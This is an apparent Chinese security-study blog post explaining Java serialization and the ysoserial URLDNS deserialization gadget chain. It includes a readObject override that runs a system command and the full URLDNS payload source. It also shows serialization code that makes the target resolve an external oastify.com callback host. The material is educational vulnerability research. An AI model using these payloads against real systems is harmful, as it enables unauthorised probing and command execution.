    <content type="html"><![CDATA[<h1 id="java反序列化-反序列化概念-URLDNS链"><a href="#java反序列化-反序列化概念-URLDNS链" class="headerlink" title="java反序列化-反序列化概念&amp;&amp;URLDNS链"></a>java反序列化-反序列化概念&amp;&amp;URLDNS链</h1><p>简单来说：</p><p><strong>序列化：对象 -&gt; 字符串</strong><br><strong>反序列化：字符串 -&gt; 对象</strong></p><h2 id="反序列化代码实现"><a href="#反序列化代码实现" class="headerlink" title="反序列化代码实现"></a>反序列化代码实现</h2><p>SerializationTest和UnserializeTest分别对Person类进行了序列化与反序列化操作。</p><p>注意：</p><ul><li><h5 id="序列化类的属性要-实现Serializable-接口"><a href="#序列化类的属性要-实现Serializable-接口" class="headerlink" title="序列化类的属性要 实现Serializable 接口"></a>序列化类的属性要 实现Serializable 接口</h5></li><li><h5 id="静态成员变量是不能被序列化"><a href="#静态成员变量是不能被序列化" class="headerlink" title="静态成员变量是不能被序列化"></a>静态成员变量是不能被序列化</h5></li><li><h5 id="transient-标识的对象成员变量不参与序列化"><a href="#transient-标识的对象成员变量不参与序列化" class="headerlink" title="transient 标识的对象成员变量不参与序列化"></a>transient 标识的对象成员变量不参与序列化</h5></li></ul><h3 id="Person-java"><a href="#Person-java" class="headerlink" title="Person.java"></a>Person.java</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> Serialize;<br><br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.Serializable;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Serializable</span> &#123;<br><br>    <span class="hljs-keyword">private</span> String name;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> age;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Person</span><span class="hljs-params">()</span>&#123;<br><br>    &#125;<br>    <span class="hljs-comment">// 构造函数</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Person</span><span class="hljs-params">(String name, <span class="hljs-type">int</span> age)</span>&#123;<br>        <span class="hljs-built_in">this</span>.name = name;<br>        <span class="hljs-built_in">this</span>.age = age;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">toString</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Person&#123;&quot;</span> +<br>                <span class="hljs-string">&quot;name=&#x27;&quot;</span> + name + <span class="hljs-string">&#x27;\&#x27;&#x27;</span> +<br>                <span class="hljs-string">&quot;, age=&quot;</span> + age +<br>                <span class="hljs-string">&#x27;&#125;&#x27;</span>;<br>    &#125;<br>    <br>&#125;<br><br></code></pre></td></tr></table></figure><h3 id="SerializationTest"><a href="#SerializationTest" class="headerlink" title="SerializationTest"></a>SerializationTest</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> Serialize;<br><br><span class="hljs-keyword">import</span> java.io.FileOutputStream;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.ObjectOutput;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SerializationTest</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException&#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));<br>        oos.writeObject(obj);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">Person</span> <span class="hljs-variable">person</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>(<span class="hljs-string">&quot;aa&quot;</span>,<span class="hljs-number">22</span>);<br>        System.out.println(person);<br>        serialize(person);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/2023/04/27/file-upload/ion/image-20230921160513237.png" alt="image-20230921160513237"></p><h3 id="UnserializeTest"><a href="#UnserializeTest" class="headerlink" title="UnserializeTest"></a>UnserializeTest</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> Serialize;<br><br><span class="hljs-keyword">import</span> java.io.FileInputStream;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UnserializeTest</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String Filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException&#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(Filename));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> ois.readObject();<br>        <span class="hljs-keyword">return</span> obj;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">Person</span> <span class="hljs-variable">person</span> <span class="hljs-operator">=</span> (Person)unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br>        System.out.println(person);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/2023/04/27/file-upload/ion/image-20230921160537177.png" alt="image-20230921160537177"></p><h2 id="反序列化产生的安全问题"><a href="#反序列化产生的安全问题" class="headerlink" title="反序列化产生的安全问题"></a>反序列化产生的安全问题</h2><p>主要问题出在<code>writeObject</code> 和 <code>readObject</code>两个方法。在服务端进行反序列化操作时，会自动执行**客户端所传入的readObject方法，这一步就可能会出问题。</p><p>最简单的情况是readObject直接可控，调用一个危险的方法，例如直接在Person.java中重写readObject方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">readObject</span><span class="hljs-params">(ObjectInputStream objectInputStream)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        objectInputStream.defaultReadObject();<br>        Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>);<br>    &#125;<br></code></pre></td></tr></table></figure><p><img src="/2023/04/27/file-upload/ion/image-20230921162543906.png" alt="image-20230921162543906"></p><p>debug可以看到，在执行readObject时，调用了重写的方法，接着触发了计算器：</p><p><img src="/2023/04/27/file-upload/ion/image-20230921162606201.png" alt="image-20230921162606201"></p><p>总之，要借助readObject方法，来调用危险的方法，执行命令。</p><h2 id="攻击条件"><a href="#攻击条件" class="headerlink" title="攻击条件"></a>攻击条件</h2><ul><li>继承Serializable</li><li>入口类</li><li>执行类</li></ul><h4 id="示例：如何找入口类"><a href="#示例：如何找入口类" class="headerlink" title="示例：如何找入口类"></a>示例：如何找入口类</h4><p>以HashMap举例，首先他实现了Serializable接口：</p><p><img src="/2023/04/27/file-upload/ion/image-20230921163739225.png" alt="image-20230921163739225"></p><p>首先找到重写的readObject：</p><p><img src="/2023/04/27/file-upload/ion/image-20230921164830331.png" alt="image-20230921164830331"></p><p>往下找，发现在一个for循环里进行了readObject操作，又将key进行了hash运算：</p><p><img src="/2023/04/27/file-upload/ion/image-20230921165153159.png" alt="image-20230921165153159"></p><p>跟进hash运算：</p><p><img src="/2023/04/27/file-upload/ion/image-20230921165406071.png" alt="image-20230921165406071"></p><p>如果key为空，返回0，否则再下一步h&#x3D;key.hashCode()：</p><p><img src="/2023/04/27/file-upload/ion/image-20230921165646807.png" alt="image-20230921165646807"></p><p>而hashCode在类Object中，为常见的函数，可以作为入口类。</p><h2 id="URLDNS链分析"><a href="#URLDNS链分析" class="headerlink" title="URLDNS链分析"></a>URLDNS链分析</h2><p>URLDNS链是反序列化利用链中比较简单的，这条链的主要作用就是用于判断是否存在Java反序列化漏洞，没有jdk版本限制，并且只依赖原生类。</p><p>首先看一下在ysoserial中给出的gadget chain:</p><p><img src="/2023/04/27/file-upload/ion/image-20230921172836817.png" alt="image-20230921172836817"></p><p><strong>HashMap.readObject()—&gt;HashMap.putVal()—&gt;HashMap.hash()—&gt;URL.hashCode()</strong></p><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p><code>java.util.HashMap</code> 重写了 <code>readObject</code>, 在反序列化时会调用 <code>hash</code> 函数计算 key 的 hashCode.而 <code>java.net.URL</code> 的 hashCode 在计算时会调用 <code>getHostAddress</code> 来解析域名, 从而发出 DNS 请求.</p><h3 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h3><p>首先给出ysoserial中的payload：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> ysoserial.payloads;<br><br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.net.InetAddress;<br><span class="hljs-keyword">import</span> java.net.URLConnection;<br><span class="hljs-keyword">import</span> java.net.URLStreamHandler;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.net.URL;<br><br><span class="hljs-keyword">import</span> ysoserial.payloads.annotation.Authors;<br><span class="hljs-keyword">import</span> ysoserial.payloads.annotation.Dependencies;<br><span class="hljs-keyword">import</span> ysoserial.payloads.annotation.PayloadTest;<br><span class="hljs-keyword">import</span> ysoserial.payloads.util.PayloadRunner;<br><span class="hljs-keyword">import</span> ysoserial.payloads.util.Reflections;<br><br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * A blog post with more details about this gadget chain is at the url below:</span><br><span class="hljs-comment"> *   https://blog.paranoidsoftware.com/triggering-a-dns-lookup-using-java-deserialization/</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> *   This was inspired by  Philippe Arteau <span class="hljs-doctag">@h</span>3xstream, who wrote a blog</span><br><span class="hljs-comment"> *   posting describing how he modified the Java Commons Collections gadget</span><br><span class="hljs-comment"> *   in ysoserial to open a URL. This takes the same idea, but eliminates</span><br><span class="hljs-comment"> *   the dependency on Commons Collections and does a DNS lookup with just</span><br><span class="hljs-comment"> *   standard JDK classes.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> *   The Java URL class has an interesting property on its equals and</span><br><span class="hljs-comment"> *   hashCode methods. The URL class will, as a side effect, do a DNS lookup</span><br><span class="hljs-comment"> *   during a comparison (either equals or hashCode).</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> *   As part of deserialization, HashMap calls hashCode on each key that it</span><br><span class="hljs-comment"> *   deserializes, so using a Java URL object as a serialized key allows</span><br><span class="hljs-comment"> *   it to trigger a DNS lookup.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> *   Gadget Chain:</span><br><span class="hljs-comment"> *     HashMap.readObject()</span><br><span class="hljs-comment"> *       HashMap.putVal()</span><br><span class="hljs-comment"> *         HashMap.hash()</span><br><span class="hljs-comment"> *           URL.hashCode()</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> */</span><br><span class="hljs-meta">@SuppressWarnings(&#123; &quot;rawtypes&quot;, &quot;unchecked&quot; &#125;)</span><br><span class="hljs-meta">@PayloadTest(skip = &quot;true&quot;)</span><br><span class="hljs-meta">@Dependencies()</span><br><span class="hljs-meta">@Authors(&#123; Authors.GEBL &#125;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">URLDNS</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">ObjectPayload</span>&lt;Object&gt; &#123;<br><br>        <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">getObject</span><span class="hljs-params">(<span class="hljs-keyword">final</span> String url)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><br>                <span class="hljs-comment">//Avoid DNS resolution during payload creation</span><br>                <span class="hljs-comment">//Since the field &lt;code&gt;java.net.URL.handler&lt;/code&gt; is transient, it will not be part of the serialized payload.</span><br>                <span class="hljs-type">URLStreamHandler</span> <span class="hljs-variable">handler</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SilentURLStreamHandler</span>();<br><br>                <span class="hljs-type">HashMap</span> <span class="hljs-variable">ht</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>(); <span class="hljs-comment">// HashMap that will contain the URL</span><br>                <span class="hljs-type">URL</span> <span class="hljs-variable">u</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(<span class="hljs-literal">null</span>, url, handler); <span class="hljs-comment">// URL to use as the Key</span><br>                ht.put(u, url); <span class="hljs-comment">//The value can be anything that is Serializable, URL as the key is what triggers the DNS lookup.</span><br><br>                Reflections.setFieldValue(u, <span class="hljs-string">&quot;hashCode&quot;</span>, -<span class="hljs-number">1</span>); <span class="hljs-comment">// During the put above, the URL&#x27;s hashCode is calculated and cached. This resets that so the next time hashCode is called a DNS lookup will be triggered.</span><br><br>                <span class="hljs-keyword">return</span> ht;<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-keyword">final</span> String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>                PayloadRunner.run(URLDNS.class, args);<br>        &#125;<br><br>        <span class="hljs-comment">/**</span><br><span class="hljs-comment">         * &lt;p&gt;This instance of URLStreamHandler is used to avoid any DNS resolution while creating the URL instance.</span><br><span class="hljs-comment">         * DNS resolution is used for vulnerability detection. It is important not to probe the given URL prior</span><br><span class="hljs-comment">         * using the serialized object.&lt;/p&gt;</span><br><span class="hljs-comment">         *</span><br><span class="hljs-comment">         * &lt;b&gt;Potential false negative:&lt;/b&gt;</span><br><span class="hljs-comment">         * &lt;p&gt;If the DNS name is resolved first from the tester computer, the targeted server might get a cache hit on the</span><br><span class="hljs-comment">         * second resolution.&lt;/p&gt;</span><br><span class="hljs-comment">         */</span><br>        <span class="hljs-keyword">static</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SilentURLStreamHandler</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">URLStreamHandler</span> &#123;<br><br>                <span class="hljs-keyword">protected</span> URLConnection <span class="hljs-title function_">openConnection</span><span class="hljs-params">(URL u)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>                        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>                &#125;<br><br>                <span class="hljs-keyword">protected</span> <span class="hljs-keyword">synchronized</span> InetAddress <span class="hljs-title function_">getHostAddress</span><span class="hljs-params">(URL u)</span> &#123;<br>                        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>                &#125;<br>        &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>其中核心代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">HashMap</span> <span class="hljs-variable">ht</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>(); <span class="hljs-comment">// HashMap that will contain the URL</span><br><span class="hljs-type">URL</span> <span class="hljs-variable">u</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(<span class="hljs-literal">null</span>, url, handler); <span class="hljs-comment">// URL to use as the Key</span><br>ht.put(u, url); <span class="hljs-comment">//The value can be anything that is Serializable, URL as the key is what triggers the DNS lookup.</span><br></code></pre></td></tr></table></figure><p>前面已经分析过，HashMap可以作为一个很好的入口类，跟进查看：</p><p><img src="/2023/04/27/file-upload/ion/image-20230922234833021.png" alt="image-20230922234833021"></p><p>看里面重写的readObject方法，和前文提到的一样，for里面调用了readObject，随后进行了<code>putVal(*hash*(key), key, value, false, false);</code>操作,先对key的值进行了hash运算，跟进hash：</p><p><img src="/2023/04/27/file-upload/ion/image-20230922235145931.png" alt="image-20230922235145931"></p><p>如果key为空，返回0，不为空就计算<code>(h = key.hashCode()) ^ (h &gt;&gt;&gt; 16)</code>。</p><p>根据payload，里面调用了ht.put方法，传参为(URL，u)：<img src="/2023/04/27/file-upload/ion/image-20230923231545863.png" alt="image-20230923231545863"></p><p>接着调用hash方法，再调用hashCode进行运算。跟到URL类中查看hashCode方法：</p><p><img src="/2023/04/27/file-upload/ion/image-20230924001116818.png" alt="image-20230924001116818"></p><p>最终return了一个hashCode，由handler.hashCode计算而来，而handler又是URLStreamHandler类的一个方法：</p><p><img src="/2023/04/27/file-upload/ion/image-20230924001228951.png" alt="image-20230924001228951"></p><p>接下来到URLStreamHandler中查看hashCode方法：</p><p><img src="/2023/04/27/file-upload/ion/image-20230924001318406.png" alt="image-20230924001318406"></p><p>这里的u就是前文提到的put传入的第一个参数—url类对象，再跟进getHostAddress方法：</p><p><img src="/2023/04/27/file-upload/ion/image-20230924001409222.png" alt="image-20230924001409222"></p><p>到这里已经很清楚了，根据传入参数，来获取其ip地址，也就是进行DNS查询。</p><p>整个的gadget为：</p><ul><li>HashMap-&gt;readObject()</li><li>HashMap-&gt;hash()</li><li>URL-&gt;hashCode()</li><li>URLStreamHandler-&gt;hashCode()</li><li>URLStreamHandler-&gt;getHostAddress()</li><li>InetAddress-&gt;getByName()</li></ul><p>接下来在SerializationTest类中添加payload：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>    <span class="hljs-type">Person</span> <span class="hljs-variable">person</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>(<span class="hljs-string">&quot;aa&quot;</span>,<span class="hljs-number">22</span>);<br>    HashMap&lt;URL,Integer&gt; hashMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;URL, Integer&gt;();<br>    hashMap.put(<span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(<span class="hljs-string">&quot;http://www.4jofyim09mcvopinp2px0ytfa6gx4nsc.oastify.com&quot;</span>),<span class="hljs-number">1</span>);<br>    System.out.println(person);<br>    serialize(person);<br>&#125;<br></code></pre></td></tr></table></figure><p>进行序列化操作：<br><img src="/2023/04/27/file-upload/ion/image-20230924103847827.png" alt="image-20230924103847827"></p><p>注意，这里在序列化时，就已经出现了DNGlog，而非预想的反序列化。</p><p>通过debug来排查一下问题，首先在hashMap.put这行下断点，跟进put方法：</p><p><img src="/2023/04/27/file-upload/ion/image-20230924104734947.png" alt="image-20230924104734947"></p><p>进到hash方法里：</p><p><img src="/2023/04/27/file-upload/ion/image-20230924104802962.png" alt="image-20230924104802962"></p><p>接下来进入到hashCode:</p><p><img src="/2023/04/27/file-upload/ion/image-20230924104826082.png" alt="image-20230924104826082"></p><p>可以看到，在这个if判断中，hashCode默认为-1，因此直接进到了handler.hashCode中：</p><p><img src="/2023/04/27/file-upload/ion/image-20230924104935546.png" alt="image-20230924104935546"></p><p>最终调用getHostAddress方法，触发了DNS请求。</p><p>改进的方法也很简单，修改hashCode的值使其不等于-1，最后再改回-1即可，由于hashCode是new URL.hashCode(),这里利用反射将其进行修改：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> Serialize;<br><br><span class="hljs-keyword">import</span> java.io.FileOutputStream;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.ObjectOutput;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.net.URL;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SerializationTest</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException&#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));<br>        oos.writeObject(obj);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-comment">/*</span><br><span class="hljs-comment">        Person person = new Person(&quot;aa&quot;,22);</span><br><span class="hljs-comment">        HashMap&lt;URL,Integer&gt; hashMap = new HashMap&lt;URL, Integer&gt;();</span><br><span class="hljs-comment">        hashMap.put(new URL(&quot;http://www.7oweiw0ttcqt4h6gwsorviguoluci26r.oastify.com&quot;),1);</span><br><span class="hljs-comment">        System.out.println(person);</span><br><span class="hljs-comment">        serialize(person);</span><br><span class="hljs-comment">         */</span><br><br>        <span class="hljs-type">Person</span> <span class="hljs-variable">person</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>(<span class="hljs-string">&quot;aa&quot;</span>,<span class="hljs-number">22</span>);<br>        HashMap&lt;URL,Integer&gt; hashmap= <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;URL,Integer&gt;();<br>        <span class="hljs-comment">// 这里不要发起请求</span><br>        <span class="hljs-type">URL</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(<span class="hljs-string">&quot;http://jxkqr8952oz5dtfs54x34up6xx3orhf6.oastify.com&quot;</span>);<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> url.getClass();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">hashcodefile</span> <span class="hljs-operator">=</span> c.getDeclaredField(<span class="hljs-string">&quot;hashCode&quot;</span>);<br>        hashcodefile.setAccessible(<span class="hljs-literal">true</span>);<br>        hashcodefile.set(url,<span class="hljs-number">1234</span>);<br>        hashmap.put(url,<span class="hljs-number">1</span>);<br>        <span class="hljs-comment">// 这里把 hashCode 改为 -1； 通过反射的技术改变已有对象的属性</span><br>        hashcodefile.set(url,-<span class="hljs-number">1</span>);<br>        serialize(hashmap);<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>修改之后，反序列化操作时才会进行DNS请求：</p><p><img src="/2023/04/27/file-upload/ion/image-20230925113805245.png" alt="image-20230925113805245"></p><p>在URL的hashCode下个断点：</p><p><img src="/2023/04/27/file-upload/ion/image-20230925132151337.png" alt="image-20230925132151337"></p><p>看到hashCode被修改为1234，因此直接return，不进行请求。</p><p>同样反序列化时debug看下：</p><p><img src="/2023/04/27/file-upload/ion/image-20230925133731671.png" alt="image-20230925133731671"></p><p>走到了getHostAddress这个方法，成功发起请求。</p>]]></content>
    
    
    <categories>
      
      <category>java</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java</tag>
      
      <tag>urldns</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>java反序列化-JDK动态代理</title>
    <link href="/2024/07/23/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-JDK%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86/"/>
    <url>/2024/07/23/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-JDK%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86/</url>
    
